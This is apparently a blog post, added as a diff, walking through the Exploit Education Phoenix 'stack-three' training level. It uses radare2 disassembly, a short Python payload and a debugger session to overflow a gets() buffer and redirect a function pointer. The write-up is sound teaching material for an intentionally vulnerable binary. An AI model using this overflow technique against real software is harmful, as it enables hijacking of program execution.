@@ -4,3 +4,266 @@ title:  "Phoenix x86 Stack Three"
 date: "2019-10-12 10:33:00 +0300"
 categories: exploit-education phoenix x86
 ---
+
+To get information about the binary, `rabin2` is really useful.
+
+{% highlight shell %}
+$ rabin2 -I /opt/phoenix/i486/stack-three 
+arch     x86
+baddr    0x8048000
+binsz    3812
+bintype  elf
+bits     32
+canary   false
+class    ELF32
+compiler GCC: (GNU) 7.3.0
+crypto   false
+endian   little
+havecode true
+intrp    /opt/phoenix/i486-linux-musl/lib/ld-musl-i386.so.1
+laddr    0x0
+lang     c
+linenum  true
+lsyms    true
+machine  Intel 80386
+maxopsz  16
+minopsz  1
+nx       false
+os       linux
+pcalign  0
+pic      false
+relocs   true
+relro    no
+rpath    /opt/phoenix/i486-linux-musl/lib
+sanitiz  false
+static   false
+stripped false
+subsys   linux
+va       true
+{% endhighlight %}
+
+Once more, this is a 32-bit Linux ELF with no protection against stack overflows.
+
+The next step is to disassemble the binary.
+
+{% highlight shell %}
+$ r2 /opt/phoenix/i486/stack-three 
+{% endhighlight %}
+
+{% highlight nasm %}
+[0x080483a0]> aas
+Cannot analyze at 0x08048620
+[0x080483a0]> afl
+0x0804831c    1 17           sym._init
+0x080484f0    7 277  -> 112  sym.frame_dummy
+0x080485e0    5 49           sym.__do_global_ctors_aux
+0x08048611    1 12           sym._fini
+0x08048470    8 113  -> 111  sym.__do_global_dtors_aux
+0x08048114   45 588  -> 695  sym..interp
+0x080483a0    1 62           entry0
+0x08048390    1 6            sym.imp.__libc_start_main
+0x08048710    1 14           loc.__GNU_EH_FRAME_HDR
+0x08048734    3 34           sym..eh_frame
+0x08048770    1 38           obj.__EH_FRAME_BEGIN
+0x080483e0    4 49   -> 40   sym.deregister_tm_clones
+0x080487b0    1 4            obj.__FRAME_END
+0x08048555    4 132          main
+0x08048535    1 32           sym.complete_level
+0x08048360    1 6            sym.imp.puts
+0x08048380    1 6            sym.imp.exit
+0x08048350    1 6            sym.imp.gets
+0x08048370    1 6            sym.imp.fflush
+[0x080483a0]> s main
+[0x08048555]> pdf
+/ (fcn) main 132
+|   int main (int argc, char **argv, char **envp);
+|           ; var int32_t var_4ch @ ebp-0x4c
+|           ; var int32_t var_ch @ ebp-0xc
+|           ; arg int32_t arg_4h @ esp+0x4
+|           ; DATA XREF from entry0 @ 0x80483d4
+|           0x08048555      8d4c2404       lea ecx, [arg_4h]
+|           0x08048559      83e4f0         and esp, 0xfffffff0
+|           0x0804855c      ff71fc         push dword [ecx - 4]
+|           0x0804855f      55             push ebp
+|           0x08048560      89e5           mov ebp, esp
+|           0x08048562      51             push ecx
+|           0x08048563      83ec54         sub esp, 0x54
+|           0x08048566      83ec0c         sub esp, 0xc
+|           0x08048569      6864860408     push str.Welcome_to_phoenix_stack_three__brought_to_you_by_https:__exploit.education ; 0x8048664 ; "Welcome to phoenix/stack-three, brought to you by https://exploit.education"
+|           0x0804856e      e8edfdffff     call sym.imp.puts           ; int puts(const char *s)
+|           0x08048573      83c410         add esp, 0x10
+|           0x08048576      c745f4000000.  mov dword [var_ch], 0
+|           0x0804857d      83ec0c         sub esp, 0xc
+|           0x08048580      8d45b4         lea eax, [var_4ch]
+|           0x08048583      50             push eax
+|           0x08048584      e8c7fdffff     call sym.imp.gets           ; char *gets(char *s)
+|           0x08048589      83c410         add esp, 0x10
+|           0x0804858c      8b45f4         mov eax, dword [var_ch]
+|           0x0804858f      85c0           test eax, eax
+|       ,=< 0x08048591      742c           je 0x80485bf
+|       |   0x08048593      8b45f4         mov eax, dword [var_ch]
+|       |   0x08048596      83ec08         sub esp, 8
+|       |   0x08048599      50             push eax
+|       |   0x0804859a      68b0860408     push str.calling_function_pointer____p ; 0x80486b0 ; "calling function pointer @ %p\n"
+|       |   0x0804859f      e89cfdffff     call sym.imp.printf         ; sym..interp+0x22c
+|       |   0x080485a4      83c410         add esp, 0x10
+|       |   0x080485a7      a1a4980408     mov eax, dword [obj.stdout] ; obj.__TMC_END
+|       |                                                              ; [0x80498a4:4]=0
+|       |   0x080485ac      83ec0c         sub esp, 0xc
+|       |   0x080485af      50             push eax
+|       |   0x080485b0      e8bbfdffff     call sym.imp.fflush         ; int fflush(FILE *stream)
+|       |   0x080485b5      83c410         add esp, 0x10
+|       |   0x080485b8      8b45f4         mov eax, dword [var_ch]
+|       |   0x080485bb      ffd0           call eax
+|      ,==< 0x080485bd      eb10           jmp 0x80485cf
+|      |`-> 0x080485bf      83ec0c         sub esp, 0xc
+|      |    0x080485c2      68d0860408     push str.function_pointer_remains_unmodified_:___better_luck_next_time ; 0x80486d0 ; "function pointer remains unmodified :~( better luck next time!"
+|      |    0x080485c7      e894fdffff     call sym.imp.puts           ; int puts(const char *s)
+|      |    0x080485cc      83c410         add esp, 0x10
+|      |    ; CODE XREF from main @ 0x80485bd
+|      `--> 0x080485cf      83ec0c         sub esp, 0xc
+|           0x080485d2      6a00           push 0
+\           0x080485d4      e8a7fdffff     call sym.imp.exit           ; void exit(int status)
+[0x08048555]> agf
+[0x08048555]>  # int main (int argc, char **argv, char **envp);
+         .-----------------------------------------------------------------------------------------.
+         |  0x8048555                                                                              |
+         | (fcn) main 132                                                                          |
+         |   int main (int argc, char **argv, char **envp);                                        |
+         | ; var int32_t var_4ch @ ebp-0x4c                                                        |
+         | ; var int32_t var_ch @ ebp-0xc                                                          |
+         | ; arg int32_t arg_4h @ esp+0x4                                                          |
+         | ; DATA XREF from entry0 @ 0x80483d4                                                     |
+         | lea ecx, [arg_4h]                                                                       |
+         | and esp, 0xfffffff0                                                                     |
+         | push dword [ecx - 4]                                                                    |
+         | push ebp                                                                                |
+         | mov ebp, esp                                                                            |
+         | push ecx                                                                                |
+         | sub esp, 0x54                                                                           |
+         | sub esp, 0xc                                                                            |
+         | ; 0x8048664                                                                             |
+         | ; "Welcome to phoenix/stack-three, brought to you by https://exploit.education"         |
+         | push str.Welcome_to_phoenix_stack_three__brought_to_you_by_https:__exploit.education    |
+         | ; int puts(const char *s)                                                               |
+         | call sym.imp.puts;[oa]                                                                  |
+         | add esp, 0x10                                                                           |
+         | mov dword [var_ch], 0                                                                   |
+         | sub esp, 0xc                                                                            |
+         | lea eax, [var_4ch]                                                                      |
+         | push eax                                                                                |
+         | ; char *gets(char *s)                                                                   |
+         | call sym.imp.gets;[ob]                                                                  |
+         | add esp, 0x10                                                                           |
+         | mov eax, dword [var_ch]                                                                 |
+         | test eax, eax                                                                           |
+         | je 0x80485bf                                                                            |
+         `-----------------------------------------------------------------------------------------'
+                 f t
+                 | |
+                 | '--------------------------------.
+    .------------'                                  |
+    |                                               |
+.-------------------------------------------.   .---------------------------------------------------------------------------.
+|  0x8048593                                |   |  0x80485bf                                                                |
+| mov eax, dword [var_ch]                   |   | sub esp, 0xc                                                              |
+| sub esp, 8                                |   | ; 0x80486d0                                                               |
+| push eax                                  |   | ; "function pointer remains unmodified :~( better luck next time!"        |
+| ; 0x80486b0                               |   | push str.function_pointer_remains_unmodified_:___better_luck_next_time    |
+| ; "calling function pointer @ %p\n"       |   | ; int puts(const char *s)                                                 |
+| push str.calling_function_pointer____p    |   | call sym.imp.puts;[oa]                                                    |
+| ; sym..interp+0x22c                       |   | add esp, 0x10                                                             |
+| call sym.imp.printf;[oc]                  |   `---------------------------------------------------------------------------'
+| add esp, 0x10                             |       v
+| ; obj.__TMC_END                           |       |
+| ; [0x80498a4:4]=0                         |       |
+| mov eax, dword [obj.stdout]               |       |
+| sub esp, 0xc                              |       |
+| push eax                                  |       |
+| ; int fflush(FILE *stream)                |       |
+| call sym.imp.fflush;[od]                  |       |
+| add esp, 0x10                             |       |
+| mov eax, dword [var_ch]                   |       |
+| call eax                                  |       |
+| jmp 0x80485cf                             |       |
+`-------------------------------------------'       |
+    v                                               |
+    |                                               |
+    '-------------------------------------.         |
+                                          | .-------'
+                                          | |
+                                    .-----------------------------------.
+                                    |  0x80485cf                        |
+                                    | ; CODE XREF from main @ 0x80485bd |
+                                    | sub esp, 0xc                      |
+                                    | push 0                            |
+                                    | ; void exit(int status)           |
+                                    | call sym.imp.exit;[oe]            |
+                                    `-----------------------------------'
+{% endhighlight %}
+
+This level is really not that different from the previous ones. What is of importance is that the variable `var_ch`, that needs to be overwritten by exploiting the vulnerable to stack-based buffer overflow `gets` call, is being `call`ed. Considering that its value can be overwritten, this means that an attacker can have control over the program execution.
+
+The approach to complete this level is identical to the previous one. The objective is to call the function `sym.complete_level` at address `0x08048535`.
+
+{% highlight python %}
+#!/usr/bin/env python3
+import os
+
+os.write(1, b'\x58'*64 + b'\x35\x85\x04\x08')
+{% endhighlight %}
+
+{% highlight shell %}
+$ ./myScript.py > pattern
+{% endhighlight %}
+
+{% highlight shell %}
+$ r2 -d /opt/phoenix/i486/stack-three -e dbg.profile=myProfile.rr2
+{% endhighlight %}
+
+{% highlight nasm %}
+[0xf7f51d4b]> aas
+Cannot analyze at 0x08048620
+[0xf7f51d4b]> db 0x08048584
+[0xf7f51d4b]> dc
+Welcome to phoenix/stack-three, brought to you by https://exploit.education
+hit breakpoint at: 8048584
+[0x08048584]> dr
+eax = 0xffebf72c
+ebx = 0xf7f87000
+ecx = 0xffebf660
+edx = 0x00000000
+esi = 0xffebf804
+edi = 0x00000001
+esp = 0xffebf710
+ebp = 0xffebf778
+eip = 0x08048584
+eflags = 0x00000296
+oeax = 0xffffffff
+[0x08048584]> px/24xw 0xffebf710
+0xffebf710  0xffebf72c 0x00000000 0x00000084 0x00000010  ,...............
+0xffebf720  0x0804831c 0x08048611 0x00000000 0x00000063  ............c...
+0xffebf730  0x00000000 0x080482e4 0x00000008 0x00000008  ................
+0xffebf740  0x00000011 0xf7f8919c 0x00000000 0x080482ec  ................
+0xffebf750  0x00000000 0x00000000 0x00000000 0x00000000  ................
+0xffebf760  0x00000000 0x00000000 0x00000000 0x00000000  ................
+[0x08048584]> px/xw 0xffebf778-0xc
+0xffebf76c  0x00000000                                   ....
+[0x08048584]> dso
+hit breakpoint at: 8048589
+[0x08048584]> px/24xw 0xffebf710
+0xffebf710  0xffebf72c 0x00000000 0x00000084 0x00000010  ,...............
+0xffebf720  0x0804831c 0x08048611 0x00000000 0x58585858  ............XXXX
+0xffebf730  0x58585858 0x58585858 0x58585858 0x58585858  XXXXXXXXXXXXXXXX
+0xffebf740  0x58585858 0x58585858 0x58585858 0x58585858  XXXXXXXXXXXXXXXX
+0xffebf750  0x58585858 0x58585858 0x58585858 0x58585858  XXXXXXXXXXXXXXXX
+0xffebf760  0x58585858 0x58585858 0x58585858 0x08048535  XXXXXXXXXXXX5...
+[0x08048584]> px/xw 0xffebf778-0xc
+0xffebf76c  0x08048535                                   5...
+[0x08048584]> dc
+calling function pointer @ 0x8048535
+Congratulations, you've finished phoenix/stack-three :-) Well done!
+{% endhighlight %}
+
+## Conclusion
+Stack Three did not differ from Stack Two besides the value that needed to be written on the local variable `var_ch`.
